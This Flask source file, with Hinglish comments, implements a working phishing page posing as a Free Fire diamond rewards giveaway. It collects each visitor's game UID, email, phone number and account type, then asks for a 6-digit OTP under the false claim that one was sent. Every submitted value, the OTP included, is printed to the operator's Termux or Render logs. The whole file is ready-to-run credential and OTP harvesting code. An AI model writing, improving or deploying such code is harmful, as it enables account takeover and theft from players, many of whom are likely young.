from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. Aapka Background Poster Link
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22574.jpg"

# 2. Aapka Purana Design (Kuch bhi nahi kaata gaya hai)
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FF Diamond Registration</title>
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            margin: 0; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .form-box {{
            background: white; padding: 25px; border-radius: 15px;
            text-align: center; width: 320px; box-shadow: 0 8px 20px rgba(0,0,0,0.5);
        }}
        input, select {{ 
            width: 100%; padding: 12px; margin: 8px 0; 
            border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; 
        }}
        .blue-btn {{ 
            background: #1a73e8; color: white; border: none; padding: 15px; 
            width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="form-box">
        <h2>💎 FREE FIRE REWARDS 💎</h2>
        <form action="/submit" method="post">
            <input type="text" name="uid" placeholder="Enter Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            <select name="account_type">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="VK">VK Account</option>
            </select>
            <button type="submit" class="blue-btn">PROCEED TO GET OTP</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

# --- YAHAN SE TERMUX PAR DATA DIKHNE KA CODE ADD KIYA HAI ---
@app.route('/submit', methods=['POST'])
def submit():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    acc = request.form.get('account_type')

    # Ye lines data ko Termux/Render logs mein dikhayengi
    print("\n" + "="*30)
    print(f"🔥 NEW LOGIN RECEIVED 🔥")
    print(f"UID: {uid}\nEmail: {email}\nPhone: {phone}\nAccount: {acc}")
    print("="*30 + "\n")

    return f'''
    <body style="text-align:center; padding-top:100px; font-family:sans-serif;">
        <h2>Verify OTP</h2>
        <p>6-Digit OTP sent to {phone}</p>
        <form action="/final" method="post">
            <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" required><br><br>
            <button type="submit" style="background:#1a73e8; color:white; padding:10px 20px; border:none; border-radius:5px;">VERIFY</button>
        </form>
    </body>
    '''

@app.route('/final', methods=['POST'])
def final():
    otp = request.form.get('otp')
    print(f"📩 RECEIVED OTP: {otp}\n" + "="*30)
    return "<h1>Registration Under Process!</h1>"

if __name__ == "__main__":
    # Render aur Termux dono ke liye port set hai
    app.run(host="0.0.0.0", port=10000)
